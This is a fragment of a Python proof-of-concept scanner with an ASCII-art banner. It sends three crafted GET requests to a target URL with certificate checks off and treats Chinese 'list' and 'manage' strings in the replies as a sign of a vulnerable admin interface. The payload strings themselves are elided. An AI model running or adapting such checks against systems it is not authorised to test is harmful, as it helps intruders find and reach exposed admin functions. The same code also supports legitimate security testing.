...
def banner():
 ...
 / _` |/ _ \| | '_ \ / _` |_____| | | '_ \| |/ /   \ \  / \// /    \ 
| (_| | (_) | | | | | (_| |_____| | | | | |   <    _\ \/ _  \/ /\/\ \
 \__, |\___/|_|_| |_|\__, |     |_|_|_| |_|_|\_\___\__/\/ \_/\/    \/
 |___/               |___/                    |_____|                """
    print(test)
...
def poc(target, output_file):
    ...
    try:
        ...
        res1 = session.get(
            url=target + payload1, headers=headers, timeout=6, verify=False
        )
        res2 = session.get(
            url=target + payload2, headers=headers, timeout=6, verify=False
        )
        res3 = session.get(
            url=target + payload3, headers=headers, timeout=6, verify=False
        )

        if "列表" in res1.text and "列表" in res2.text and "管理" in res3.text:
